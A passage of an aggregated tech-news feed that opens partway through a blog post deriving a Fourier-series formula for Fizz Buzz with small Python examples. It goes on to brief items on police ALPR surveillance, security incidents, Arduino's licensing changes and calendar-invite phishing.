  This function helps us select another function \( s_{f(n)}(n) \)
  which in turn determines the \( n \)th term of the Fizz Buzz
  sequence.  Our goal now is to replace this piecewise formula with a
  single closed-form expression.  To do so, we first define indicator
  functions \( I_m(n) \) as follows:

  \[
    I_m(n) = \begin{cases}
      1 & \text{if } m \mid n, \\
      0 & \text{if } m \nmid n.
    \end{cases}
  \]

  The formula for \( f(n) \) can now be written as:

  \[
    f(n) = \begin{cases}
      0 & \text{if } I_5(n) = 0 \text{ and } I_3(n) = 0, \\
      1 & \text{if } I_5(n) = 0 \text{ and } I_3(n) = 1, \\
      2 & \text{if } I_5(n) = 1 \text{ and } I_3(n) = 0, \\
      3 & \text{if } I_5(n) = 1 \text{ and } I_3(n) = 1.
    \end{cases}
  \]

  Do you see a pattern?  Here is the same function written as a table:

  Do you see it now?  If we treat the values in the first two columns
  as binary digits and the values in the third column as decimal
  numbers, then in each row the first two columns give the binary
  representation of the number in the third column.  For example, \(
  3_{10} = 11_2 \) and indeed in the last row of the table, we see the
  bits \( 1 \) and \( 1 \) in the first two columns and the number \(
  3 \) in the last column.  In other words, writing the binary digits
  \( I_5(n) \) and \( I_3(n) \) side by side gives us the binary
  representation of \( f(n).  \)  Therefore

  \[
    f(n) = 2 \, I_5(n) + I_3(n).
  \]

  We can now write a small program to demonstrate this formula:
for n in range(1, 101):
    s = [n, 'Fizz', 'Buzz', 'FizzBuzz']
    i = (n % 3 == 0) + 2 * (n % 5 == 0)
    print(s[i])
  We can make it even shorter at the cost of some clarity:
for n in range(1, 101):
    print([n, 'Fizz', 'Buzz', 'FizzBuzz'][(n % 3 == 0) + 2 * (n % 5 == 0)])
  What we have obtained so far is pretty good.  While there is no
  universal definition of a closed-form expression, I think most
  people would agree that the indicator functions as defined above are
  simple enough to be permitted in a closed-form expression.

  In the previous section, we obtained the formula

  \[
    f(n) = I_3(n) + 2 \, I_5(n)
  \]

  which we then used as an index to look up the text to be printed.
  We also argued that this is a pretty good closed-form expression
  already.

  However, in the interest of making things more complicated, we must
  ask ourselves: What if we are not allowed to use the indicator
  functions?  What if we must adhere to the commonly accepted meaning
  of a closed-form expression which allows only finite combinations of
  basic operations such as addition, subtraction, multiplication,
  division, integer exponents and roots with integer index as well as
  functions such as exponentials, logarithms and trigonometric
  functions.  It turns out that the above formula can be rewritten
  using only addition, multiplication, division and the cosine
  function.  Let us begin the translation.  Consider the sum

  \[
    S_m(n) = \sum_{k = 0}^{m - 1} e^{i 2 \pi k n / m},
  \]

  where \( i \) is the imaginary unit and \( n \) and \( m \) are
  integers.  This is a geometric series in the complex plane with
  ratio \( r = e^{i 2 \pi n / m}.  \)  If \( n \) is a multiple of \( m
 , \) then \( n = cm \) for some integer \( c \) and we get

  \[
    r
    = e^{i 2 \pi n / m}
    = e^{i 2 \pi c}
    = 1.
  \]

  Therefore, when \( n \) is a multiple of \( m, \) we get

  \[
    S_m(n)
    = \sum_{k = 0}^{m - 1} e^{i 2 \pi k n / m}
    = \sum_{k = 0}^{m - 1} 1^k
    = m.
  \]

  If \( n \) is not a multiple of \( m, \) then \( r \ne 1 \) and the
  geometric series becomes

  \[
    S_m(n)
    = \frac{r^m - 1}{r - 1}
    = \frac{e^{i 2 \pi n} - 1}{e^{i 2 \pi n / m} - 1}
    = 0.
  \]

  Therefore,

  \[
    S_m(n) = \begin{cases}
      m & \text{if } m \mid n, \\
      0 & \text{if } m \nmid n.
    \end{cases}
  \]

  Dividing both sides by \( m, \) we get

  \[
    \frac{S_m(n)}{m} = \begin{cases}
      1 & \text{if } m \mid n, \\
      0 & \text{if } m \nmid n.
    \end{cases}
  \]

  But the right-hand side is \( I_m(n).  \)  Therefore

  \[
    I_m(n)
    = \frac{S_m(n)}{m}
    = \frac{1}{m} \sum_{k = 0}^{m - 1} e^{i 2 \pi k n / m}.
  \]

  We begin with Euler's formula

  \[
    e^{i x} = \cos x + i \sin x
  \]

  where \( x \) is a real number.  From this formula, we get

  \[
    e^{i x} + e^{-i x} = 2 \cos x.
  \]

  Therefore

  \begin{align*}
    I_3(n)
    &= \frac{1}{3} \sum_{k = 0}^2 e^{i 2 \pi k n / 3} \\
    &= \frac{1}{3} \left( 1 + e^{i 2 \pi n / 3} +
                                  e^{i 4 \pi n / 3} \right) \\
    &= \frac{1}{3} \left( 1 + e^{i 2 \pi n / 3} +
                                  e^{-i 2 \pi n / 3} \right) \\
    &= \frac{1}{3} + \frac{2}{3} \cos \left( \frac{2 \pi n}{3} \right).
  \end{align*}

  The third equality above follows from the fact that \( e^{i 4 \pi n
  / 3} = e^{i 6 \pi n / 3} e^{-i 2 \pi n / 3} = e^{i 2 \pi n} e^{-i 2
  \pi n/3} = e^{-i 2 \pi n / 3} \) when \( n \) is an integer.

  The function above is defined for integer values of \( n \) but we
  can extend its formula to real \( x \) and plot it to observe its
  shape between integers.  As expected, the function takes the value
  \( 1 \) whenever \( x \) is an integer multiple of \( 3 \) and \( 0
  \) whenever \( x \) is an integer not divisible by \( 3.  \)

  Similarly,

  \begin{align*}
    I_5(n)
    &= \frac{1}{5} \sum_{k = 0}^4 e^{i 2 \pi k n / 5} \\
    &= \frac{1}{5} \left( 1 + e^{i 2 \pi n / 5}
                                + e^{i 4 \pi n / 5}
                                + e^{i 6 \pi n / 5}
                                + e^{i 8 \pi n / 5} \right) \\
    &= \frac{1}{5} \left( 1 + e^{i 2 \pi n / 5}
                                + e^{i 4 \pi n / 5}
                                + e^{-i 4 \pi n / 5}
                                + e^{-i 2 \pi n / 5} \right) \\
    &= \frac{1}{5} + \frac{2}{5} \cos \left( \frac{2 \pi n}{5} \right)
                       + \frac{2}{5} \cos \left( \frac{4 \pi n}{5} \right).
  \end{align*}

  Extending this expression to real values of \( x \) allows us to
  plot its shape as well.  Once again, the function takes the value \(
  1 \) at integer multiples of \( 5 \) and \( 0 \) at integers not
  divisible by \( 5.  \)

  Recall that we expressed \( f(n) \) as

  \[
    f(n) = I_3(n) + 2 \, I_5(n).
  \]

  Substituting these trigonometric expressions yields

  \[
    f(n)
    = \frac{1}{3}
      + \frac{2}{3} \cos \left( \frac{2 \pi n}{3} \right)
      + 2 \cdot \left(
        \frac{1}{5}
        + \frac{2}{5} \cos \left( \frac{2 \pi n}{5} \right)
        + \frac{2}{5} \cos \left( \frac{4 \pi n}{5} \right)
      \right).
  \]

  A straightforward simplification gives

  \[
    f(n)
    = \frac{11}{15}
      + \frac{2}{3} \cos \left( \frac{2 \pi n}{3} \right)
      + \frac{4}{5} \cos \left( \frac{2 \pi n}{5} \right)
      + \frac{4}{5} \cos \left( \frac{4 \pi n}{5} \right).
  \]

  We can extend this expression to real \( x \) and plot it as well.
  The resulting curve takes the values \( 0, 1, 2 \) and \( 3 \) at
  integer points, as desired.

  Now we can write our Python program as follows:
from math import cos, pi
for n in range(1, 101):
    s = [n, 'Fizz', 'Buzz', 'FizzBuzz']
    i = round(11 / 15 + (2 / 3) * cos(2 * pi * n / 3)
                      + (4 / 5) * cos(2 * pi * n / 5)
                      + (4 / 5) * cos(4 * pi * n / 5))
    print(s[i])Discrete Fourier Transform
  The keen-eyed might notice that the expression we obtained for \(
  f(n) \) is a discrete Fourier series.  This is not surprising, since
  the output of a Fizz Buzz program depends only on \( n \bmod 15.  \)
  Any function on a finite cyclic group can be written exactly as a
  finite Fourier expansion.  In this section, we obtain \( f(n) \)
  using the discrete Fourier transform.  It is worth mentioning that
  the calculations presented here are quite tedious to do by hand.
  Nevertheless, this section offers a glimpse of how such calculations
  are performed.  By the end, we will arrive at exactly the same \(
  f(n) \) as before.  There is nothing new to discover here.  We
  simply obtain the same result by a more direct but more laborious
  method.  If this doesn't sound interesting to you, you may safely
  skip this section.
\( \gdef\arraystretch{1.2} \)
  We know that \( f(n) \) is a periodic function with period \( 15.  \)
  To apply the discrete Fourier transform, we look at one complete
  period of the function using the values \( n = 0, 1, \dots, 14.  \)
  Over this period, we have:

  \begin{array}{c|ccccccccccccccc}
     n &  0 &  1 & 2 & 3 & 4
       &  5 &  6 &  7 & 8 & 9
       & 10 & 11 & 12 & 13 & 14 \\
    \hline
    f(n) & 3 & 0 & 0 & 1 & 0
         & 2 & 1 & 0 & 0 & 1
         & 2 & 0 & 1 & 0 & 0
  \end{array}

  The discrete Fourier series of \( f(n) \) is

  \[
    f(n) = \sum_{k = 0}^{14} c_k \, e^{i 2 \pi k n / 15}
  \]

  where the Fourier coefficients \( c_k \) are given by the discrete
  Fourier transform

  \[
    c_k = \frac{1}{15} \sum_{n = 0}^{14} f(n) e^{-i 2 \pi k n / 15}.
  \]

  for \( k = 0, 1, \dots, 14.  \)  The formula for \( c_k \) is called
  the discrete Fourier transform (DFT).  The formula for \( f(n) \) is
  called the inverse discrete Fourier transform (IDFT).

  Let \( \omega = e^{-i 2 \pi / 15}.  \)  Then using the values of \(
  f(n) \) from the table above, the DFT becomes:

  \[
    c_k = \frac{3 + \omega^{3k} + 2 \omega^{5k} + \omega^{6k}
                  + \omega^{9k} + 2 \omega^{10k} + \omega^{12k}}{15}.
  \]

  Substituting \( k = 0, 1, 2, \dots, 14 \) into the above equation
  gives us the following Fourier coefficients:

  \begin{align*}
    c_{0}  &= \frac{11}{15}, \\
    c_{3}  &= c_{6} = c_{9} = c_{12} = \frac{2}{5}, \\
    c_{5}  &= c_{10} = \frac{1}{3}, \\
    c_{1}  &= c_{2} = c_{4} = c_{7} = c_{8} = c_{11} = c_{13} = c_{14} = 0.
  \end{align*}

  Calculating these Fourier coefficients by hand can be rather
  tedious.  In practice they are almost always calculated using
  numerical software, computer algebra systems or even simple code
  such as the example here:
  fizz-buzz-fourier.py.
  Once the coefficients are known, we can substitute them into the
  inverse transform introduced earlier to obtain

  \begin{align*}
    f(n)
    &= \sum_{k = 0}^{14} c_k \, e^{i 2 \pi k n / 15} \\[1.5em]
    &= \frac{11}{15}
           + \frac{2}{5} \left(
             e^{i 2 \pi \cdot 3n / 15}
             + e^{i 2 \pi \cdot 6n / 15}
             + e^{i 2 \pi \cdot 9n / 15}
             + e^{i 2 \pi \cdot 12n / 15}
           \right) \\
           & \phantom{=\frac{11}{15}}
           + \frac{1}{3} \left(
             e^{i 2 \pi \cdot 5n / 15}
             + e^{i 2 \pi \cdot 10n / 15}
           \right) \\[1em]
    &= \frac{11}{15}
           + \frac{2}{5} \left(
             e^{i 2 \pi \cdot 3n / 15}
             + e^{i 2 \pi \cdot 6n / 15}
             + e^{-i 2 \pi \cdot 6n / 15}
             + e^{-i 2 \pi \cdot 3n / 15}
           \right) \\
           & \phantom{=\frac{11}{15}}
           + \frac{1}{3} \left(
             e^{i 2 \pi \cdot 5n / 15}
             + e^{-i 2 \pi \cdot 5n / 15}
           \right) \\[1em]
    &= \frac{11}{15}
       + \frac{2}{5} \left(
         2 \cos \left( \frac{2 \pi n}{5} \right)
         + 2 \cos \left( \frac{4 \pi n}{5} \right)
       \right) \\
       & \phantom{=\frac{11}{15}}
       + \frac{1}{3} \left(
         2 \cos \left( \frac{2 \pi n}{3} \right)
       \right) \\[1em]
    &= \frac{11}{15} +
       \frac{4}{5} \cos \left( \frac{2 \pi n}{5} \right) +
       \frac{4}{5} \cos \left( \frac{4 \pi n}{5} \right) +
       \frac{2}{3} \cos \left( \frac{2 \pi n}{3} \right).
  \end{align*}

  This is exactly the same expression for \( f(n) \) we obtained in
  the previous section.  We see that the Fizz Buzz index function \(
  f(n) \) can be expressed precisely using the machinery of Fourier
  analysis.

  To summarise, we have defined the Fizz Buzz sequence as

  \[
    (s_{f(n)}(n))_{n = 1}^{\infty}
  \]

  where

  \[
    f(n)
    = \frac{11}{15} +
      \frac{2}{3} \cos \left( \frac{2 \pi n}{3} \right) +
      \frac{4}{5} \cos \left( \frac{2 \pi n}{5} \right) +
      \frac{4}{5} \cos \left( \frac{4 \pi n}{5} \right).
  \]

  and \( s_0(n) = n, \) \( s_1(n) = \mathtt{Fizz}, \) \( s_2(n) =
  \mathtt{Buzz} \) and \( s_3(n) = \mathtt{FizzBuzz}.  \)  A Python
  program to print the Fizz Buzz sequence based on this definition was
  presented earlier.  That program can be written more succinctly as
  follows:
from math import cos, pi
for n in range(1, 101):
    print([n, 'Fizz', 'Buzz', 'FizzBuzz'][round(11 / 15 + (2 / 3) * cos(2 * pi * n / 3) + (4 / 5) * (cos(2 * pi * n / 5) + cos(4 * pi * n / 5)))])
  We can also wrap this up nicely in a shell one-liner, in case you
  want to share it with your friends and family and surprise them:
python3 -c 'from math import cos, pi; [print([n, "Fizz", "Buzz", "FizzBuzz"][round(11/15 + (2/3) * cos(2*pi*n/3) + (4/5) * (cos(2*pi*n/5) + cos(4*pi*n/5)))]) for n in range(1, 101)]'
  We have taken a simple counting game and turned it into a
  trigonometric construction consisting of a discrete Fourier series
  with three cosine terms and four coefficients.  None of this makes
  Fizz Buzz any easier.  Quite the contrary.  But it does show that
  every \( \mathtt{Fizz} \) and \( \mathtt{Buzz} \) now owes its
  existence to a particular set of Fourier coefficients.  We began
  with the modest goal of making this simple problem more complicated.
  I think it is safe to say that we did not fall short.
]]></content:encoded></item><item><title>How Cops Are Using Flock&apos;s ALPR Network to Surveil Protesters and Activists</title><link>https://www.eff.org/deeplinks/2025/11/how-cops-are-using-flock-safetys-alpr-network-surveil-protesters-and-activists</link><author>pseudalopex</author><category>dev</category><pubDate>Fri, 21 Nov 2025 17:20:51 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Law Enforcement Agencies that Ran Searches Corresponding with "No Kings" RalliesAnaheim Police Department, Calif.Arizona Department of Public SafetyBeaumont Police Department, TexasCharleston Police Department, SCFlagler County Sheriff's Office, Fla.Lisle Police Department, Ill.Little Rock Police Department, Ark.Marion Police Department, OhioMorristown Police Department, Tenn.Oro Valley Police Department, Ariz.Putnam County Sheriff's Office, Tenn.Richmond Police Department, Va.Riverside County Sheriff's Office, Calif.Salinas Police Department, Calif.San Bernardino County Sheriff's Office, Calif.Spartanburg Police Department, SCTempe Police Department, Ariz.Tulsa Police Department, Okla.]]></content:encoded></item><item><title>CrowdStrike catches insider feeding information to hackers</title><link>https://www.bleepingcomputer.com/news/security/crowdstrike-catches-insider-feeding-information-to-hackers/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 21 Nov 2025 16:48:41 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[American cybersecurity firm CrowdStrike has confirmed that an insider shared screenshots taken on internal systems with hackers after they were leaked on Telegram by the Scattered Lapsus$ Hunters threat actors. [...]]]></content:encoded></item><item><title>You can make PS2 games in JavaScript</title><link>https://jslegenddev.substack.com/p/you-can-now-make-ps2-games-in-javascript</link><author>tosh</author><category>dev</category><pubDate>Fri, 21 Nov 2025 16:42:19 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Show HN: Wealthfolio 2.0- Open source investment tracker. Now Mobile and Docker</title><link>https://wealthfolio.app/?v=2.0</link><author>a-fadil</author><category>dev</category><pubDate>Fri, 21 Nov 2025 16:34:52 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[See how your investments stack up, all in one place. Compare your accounts side by side, check if you are beating the S&P 500, and track your favorite ETFs without the hassle. No fancy jargon - just clear, useful charts that help you understand how your money is really doing.]]></content:encoded></item><item><title>Chinese Hackers Exploiting WSUS Remote Code Execution Vulnerability to Deploy ShadowPad Malware</title><link>https://cybersecuritynews.com/chinese-hackers-exploiting-wsus-remote-code-execution-vulnerability/</link><author></author><category>security</category><pubDate>Fri, 21 Nov 2025 16:15:27 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Chinese-backed attackers have begun weaponizing a critical vulnerability in Microsoft Windows Server Update Services (WSUS) to distribute ShadowPad, a sophisticated backdoor malware linked to multiple ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>FCC rolls back cybersecurity rules for telcos, despite state-hacking risks</title><link>https://www.bleepingcomputer.com/news/security/fcc-rolls-back-cybersecurity-rules-for-telcos-despite-state-hacking-risks/</link><author>Bill Toulas</author><category>security</category><pubDate>Fri, 21 Nov 2025 16:01:41 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The Federal Communications Commission (FCC) has rolled back a previous ruling that required U.S. telecom carriers to implement stricter cybersecurity measures following the massive hack from the Chinese threat group known as Salt Typhoon. [...]]]></content:encoded></item><item><title>Arduino published updated terms and conditions: no longer an open commons</title><link>https://www.molecularist.com/2025/11/did-qualcomm-kill-arduino-for-good.html</link><author>felineflock</author><category>dev</category><pubDate>Fri, 21 Nov 2025 15:44:16 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Six weeks ago, Qualcomm acquired Arduino. The maker community immediately worried that Qualcomm would kill the open-source ethos that made Arduino the lingua franca of hobby electronics.This week, Arduino published updated terms and conditions and a new privacy policy, clearly rewritten by Qualcomm’s lawyers. The changes confirm the community’s worst fears: Arduino is no longer an open commons. It’s becoming just another corporate platform.Here’s what’s at stake, what Qualcomm got wrong, and what might still be salvaged, drawing from community discussions across makerforums and sites.The new terms read like standard corporate boilerplate: mandatory arbitration, data integration with Qualcomm’s global ecosystem, export controls, AI use restrictions. For any other SaaS platform, this would be unremarkable.But Arduino isn’t SaaS. It’s the foundation of the maker ecosystem.The most dangerous change is Arduino now explicitly states that using their platform grants you no patent licenses whatsoever. You can’t even argue one is implied. This means Qualcomm could potentially assert patents against your projects if you built them using Arduino tools, Arduino examples, or Arduino-compatible hardware.And here’s the disconnect, baffling makers. Arduino’s IDE is licensed under AGPL. Their CLI is GPL v3. Both licenses explicitly require that you can reverse engineer the software. But the new Qualcomm terms explicitly forbid reverse engineering “the Platform.”The community is trying to figure out what is Qualcomm’s actual intent. Are these terms just bad lawyering with SaaS lawyers applying their standard template to cloud services, not realizing Arduino is different? Or is Qualcomm testing how much they can get away with before the community revolts? Or is this a first step toward locking down the ecosystem they just bought?Some people point out that “the Platform” might only mean Arduino’s cloud services (forums, Arduino Cloud, Project Hub) not the IDE and CLI that everyone actually uses.If that’s true, Qualcomm needs to say so, explicitly, and in plain language. Because library maintainers are likely wondering whether contributing to Arduino repos puts them at legal risk. And hardware makers are questioning whether “Arduino-compatible” is still safe to advertise. Why Adafruit’s alarm mattersAdafruit has been vocal about the dangers of this acquisition. Some dismiss Adafruit’s criticism as self-serving. After all, they sell competing hardware and promote CircuitPython. But that misses who Adafruit is.Adafruit has been the moral authority on open hardware for decades. They’ve made their living proving you can build a successful business on open principles. When they sound the alarm, it’s not about competition, it’s about principle.What they’re calling out isn’t that Qualcomm bought Arduino. It’s that Qualcomm’s lawyers fundamentally don’t understand what they bought. Arduino wasn’t valuable because it was just a microcontroller company. It was valuable because it was a commons. And you can’t apply enterprise legal frameworks to a commons without destroying it.Adafruit gets this. They’ve built their entire business on this. That’s why their criticism carries weight.What Qualcomm doesn’t seem to understandQualcomm probably thought they were buying an IoT hardware company with a loyal user base. They weren’t. They bought the IBM PC of the maker world.Arduino’s value was never just the hardware. Their boards have been obsolete for years. Their value is the standard. The Arduino IDE is the lingua franca of hobby electronics. Millions of makers learned on it, even if they moved to other hardware. ESP32, STM32, Teensy, Raspberry Pi Pico – none of them are Arduino hardware, but they all work with the Arduino IDE.Thousands of libraries are “Arduino libraries.” Tutorials assume Arduino. University curricula teach Arduino. When you search “how to read a sensor,” the answer comes back in Arduino code.This is the ecosystem Qualcomm’s lawyers just dropped legal uncertainty onto.If Qualcomm’s lawyers start asserting control over the IDE, CLI, or core libraries under restrictive terms, they will poison the entire maker ecosystem. Even people who never buy Arduino hardware are dependent on Arduino software infrastructure.Qualcomm didn’t just buy a company. They bought a commons. And now they inadvertently are taking steps that are destroying what made it valuable.What are makers supposed to do?There has been some buzz of folks just leaving the Arduino environment behind. But Arduino IDE alternatives such as PlatformIO and VSCode are not in any way beginner friendly. If the Arduino IDE goes, then there’s a huge problem. I remember when Hypercard ended. There were alternatives, but none so easy. I don’t think I really coded again for almost 20 years until I picked up the Arduino IDE (go figure).If something happens to the Arduino IDE, even if its development stalls or becomes encumbered, there’s no replacement for that easy onboarding. We’d lose many promising new makers because the first step became too steep.The institutional knowledge at riskBut leaving Arduino behind isn’t simple. The platform’s success depends on two decades of accumulated knowledge, such as countless Arduino tutorials on YouTube, blogs, and school curricula; open-source libraries that depend on Arduino compatibility; projects in production using Arduino tooling; and university programs built around Arduino as the teaching platformAll of these depend on Arduino remaining open and accessible.If Qualcomm decided to sunset the open Arduino IDE in favor of a locked-down “Arduino Pro” platform, or if they start asserting patent claims, or if uncertainty makes contributors abandon the ecosystem, all that knowledge becomes stranded.It’s like Wikipedia going behind a paywall. The value isn’t just the content, it is the trust that it remains accessible. Arduino’s value isn’t just the code, it’s the trust that the commons would stay open.That trust is now gone. And once lost, it hard to get back.Why this happened (but doesn’t excuse it)Let’s be fair to Qualcomm, their lawyers were doing their jobs.When you acquire a company, you standardize the legal terms; add mandatory arbitration to limit class action exposure; integrate data systems for compliance and auditing; add export controls because you sell to defense contractors; prohibit reverse engineering because that’s in the template.For most acquisitions, this is just good corporate hygiene. And Arduino, now part of a megacorp, faces higher liabilities than it did as an independent entity.But here’s what Qualcomm’s lawyers missed: Arduino isn’t a normal acquisition. The community isn’t a customer base, it’s a commons. And you can’t apply enterprise SaaS legal frameworks to a commons without destroying what made it valuable.This is tone-deafness, not malice. But the outcome is the same. A community that trusted Arduino no longer does.Understanding why this happened doesn’t excuse it, but it might suggest what needs to happen next.What should have happened and how to still save itQualcomm dropped legal boilerplate on the community with zero context and let people discover the contradictions themselves. That’s how you destroy trust overnight.Qualcomm should have announced the changes in advance. They should have given the community weeks, not hours, to understand what’s changing and why. They should have used plain-language explanations, not just legal documents.Qualcomm can fix things by explicitly carving out the open ecosystem. They should state clearly that the terms apply to Arduino Cloud services, and the IDE, CLI, and core libraries remain under their existing open source licenses.We’d need concrete commitments, such as which repos stay open, which licenses won’t change, what’s protected from future acquisition decisions. Right now we have vague corporate-speak about “supporting the community.” Indeed, they could create some structural protection, as well, by putting IDE, CLI, and core libraries in a foundation that Qualcomm couldn’t unilaterally control (think the Linux Foundation model).Finally, Qualcomm might wish to establish some form of community governance with real representation and real power over the tools the community depends on.The acquisition is done. The legal integration is probably inevitable. But how it’s done determines whether Arduino survives as a commons or dies as just another Qualcomm subsidiary.Arduino may be the toolset that made hobby electronics accessible to millions. But that maker community built Arduino into what it became. Qualcomm’s acquisition has thrown that legacy into doubt. Whether through legal confusion, corporate tone-deafness, or deliberate strategy, the community’s trust is broken.The next few months will reveal whether this was a stumble or a strategy. If Qualcomm issues clarifications, moves repos to some sort of governance, and explicitly protects the open toolchain, then maybe this is salvageable. If they stay silent, or worse, if IDE development slows or license terms tighten further, then that’s a signal to find alternatives. The question isn’t whether the open hobby electronics maker community survives. It’s whether Arduino does.]]></content:encoded></item><item><title>&apos;Scattered Spider&apos; teens plead not guilty to UK transport hack</title><link>https://www.bleepingcomputer.com/news/security/scattered-spider-teens-plead-not-guilty-to-uk-transport-hack/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 21 Nov 2025 15:41:24 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Two British teenagers have denied charges related to an investigation into the breach of Transport for London (TfL) in August 2024, which caused millions of pounds in damage and exposed customer data. [...]]]></content:encoded></item><item><title>Grafana Patches CVSS 10.0 SCIM Flaw Enabling Impersonation and Privilege Escalation</title><link>https://thehackernews.com/2025/11/grafana-patches-cvss-100-scim-flaw.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSd96MdjXbbJYSzwIs4CNhCrhOSN5Avm0c3kgMEQVlWBzUPXLbXKs_Kyjk_LhSeKQLjJRbzxyl7SCv62tvd2GEHySWOO__C_f5h2u-5md5Nycx87_WmNUx0CSZ7FCNVEI8LEavtyCoV7cHBFDbdNDaGMrX65oRX0pR17RJcKGIA8PofZ5YhsMrhQV1xpAt/s1600/grafana.jpg" length="" type=""/><pubDate>Fri, 21 Nov 2025 15:40:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Grafana has released security updates to address a maximum severity security flaw that could allow privilege escalation or user impersonation under certain configurations.
The vulnerability, tracked as CVE-2025-41115, carries a CVSS score of 10.0. It resides in the System for Cross-domain Identity Management (SCIM) component that allows automated user provisioning and management. First]]></content:encoded></item><item><title>Fake calendar invites are spreading. Here’s how to remove them and prevent more</title><link>https://www.malwarebytes.com/blog/news/2025/11/fake-calendar-invites-are-spreading-heres-how-to-remove-them-and-prevent-more</link><author></author><category>threatintel</category><pubDate>Fri, 21 Nov 2025 15:28:23 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[We’re seeing a surge in phishing calendar invites that users can’t delete, or that keep coming back because they sync across devices. The good news is you can remove them and block future spam by changing a few settings.Most of these unwanted calendar entries are there for phishing purposes. Most of them warn you about a “impending payment” but the difference is in the subject and the action they want the target to take.Sometimes they want you to call a number:And sometimes they invite you to an actual meeting:We haven’t followed up on these scams, but when attackers want you to call them or join a meeting, the end goal is almost always financial. They might use a tech support scam approach and ask you to install a Remote Monitoring and Management tool, sell you an overpriced product, or simply ask for your banking details.How to remove fake entries from your calendarThis blog focuses on how to remove these unwanted entries. One of the obstacles is that calendars often sync across devices.To disable automatic calendar additions:To prevent unknown senders from adding invites:Tap  >  > Add invitations to my calendar.Select Only if the sender is known.For help reviewing which apps have access to your Android Calendar, refer to the support page.To control how events get added to your Calendar on a Mac:Go to u >  > . Turn calendar access on or off for each app in the list.If you allow access, click  to choose whether the app has full access or can only add events.The controls are similar to macOS, but you may also want to remove additional calendars:Tap  >  > .Select any unwanted calendars and tap the  option.Which brings me to my next point. Check both the Outlook Calendar and the mobile Calendar app for  or  and Delete/Unsubscribe. This will stop the attacker from being able to add even more events to your Calendar. And looking in both places will be helpful in case of synchronization issues.Several victims reported that after removing an event, they just came back. This is almost always due to synchronization. Make sure you remove the unwanted calendar or event everywhere it exists.Tracking down the source can be tricky, but it may help prevent the next wave of calendar spam.How to prevent calendar spamWe’ve covered some of this already, but the main precautions are:Turn off auto‑add or auto‑processing so invites stay as emails until you accept them.Restrict calendar permissions so only trusted people and apps can add events.In shared or resource calendars, remove public or anonymous access and limit who can create or edit items.Use an up-to-date real-time anti-malware solution with a web protection component to block known malicious domains.Don’t engage with unsolicited events. Don’t click links, open attachments, or reply to suspicious calendar events such as “investment,” “invoice,” “bonus payout,” “urgent meeting”—just delete the event.If you’re not sure whether an event is a scam, you can feed the message to Malwarebytes Scam Guard. It’ll help you decide what to do next.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Make product worse, get money</title><link>https://dynomight.net/worse/</link><author>zdw</author><category>dev</category><pubDate>Fri, 21 Nov 2025 15:23:20 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I recently asked why people seem to hate dating apps so much. In response, 80% of you emailed me some version of the following theory:The thing about dating apps is that if they do a good job and match people up, then the matched people will quit the app and stop paying. So they have an incentive to string people along but not to actually help people find long-term relationships.May I explain why I don’t find this type of theory very helpful?I’m not saying that I think it’s wrong, mind you. Rather, my objection is that while the theory is phrased in terms of dating apps, the same basic pattern applies to basically anyone who is trying to make money by doing anything.For example, consider a pizza restaurant. Try these theories on for size: “The thing about pizza restaurants is that if they use expensive ingredients or labor-intensive pizza-making techniques, then it costs more to make pizza. So they have an incentive to use low-cost ingredients and labor-saving shortcuts.” “The thing about pizza restaurants is that if they have nice tables separated at a comfortable distance, then they can’t fit as many customers. So they have an incentive to use tiny tables and cram people in cheek by jowl.” “The thing about pizza restaurants is that if they sell big pizzas, then people will eat them and stop being hungry, meaning they don’t buy additional pizza. So they have an incentive to serve tiny low-calorie pizzas.”See what I mean? You can construct similar theories for other domains, too: “The thing about automakers is that making cars safe is expensive. So they have an incentive to make unsafe cars.” “The thing about video streaming is that high-resolution video uses more expensive bandwidth. So they have an incentive to use low-resolution.” “The thing about bloggers is that research is time-consuming. So they have an incentive to be sloppy about the facts.” “The thing about {lightbulb, car, phone, refrigerator, cargo ship} manufacturing is that if you make a {lightbulb, car, phone, refrigerator, cargo ship} that lasts a long time, then people won’t buy new ones. So there’s an incentive to make {lightbulbs, cars, phones, refrigerators, cargo ships} that break quickly.”All these theories can be thought of as instances of two general patterns:Make product worse, get money: “The thing about selling goods or services is that making goods or services better costs money. So people have an incentive to make goods and services worse.” “The thing about selling goods and services is that if you raise prices, then you get more money. So people have an incentive to raise prices.”Are these theories wrong? Not exactly. But it sure seems like something is missing.I’m sure most pizza restauranteurs would be thrilled to sell lukewarm 5 cm cardboard discs for $300 each. They do in fact have an incentive to do that, just as predicted by these theories! Yet, in reality, pizza restaurants usually sell pizzas that are made out of food. So clearly these theories aren’t telling the whole story.Say you have a lucrative business selling 5 cm cardboard discs for $300. I am likely to think, “I like money. Why don’t I sell pizzas that are only  cardboard, but also partly made of flour? And why don’t I sell them for $200, so I can steal Valued Reader’s customers?” But if I did that, then someone else would probably set prices at only $100, or even introduce cardboard-free pizzas, and this would continue until hitting some kind of equilibrium.Sure, producers want to charge infinity dollars for things that cost them zero dollars to make. But  want to pay zero dollars for stuff that’s infinitely valuable. It’s in the conflict between these desires that all interesting theories live.This is why I don’t think it’s helpful to point out that people have an incentive to make their products worse. Of course they do. The interesting question is, why are they able to get away with it?First reason stuff is bad: People are cheapWhy are seats so cramped on planes? Is it because airlines are greedy? Sure. 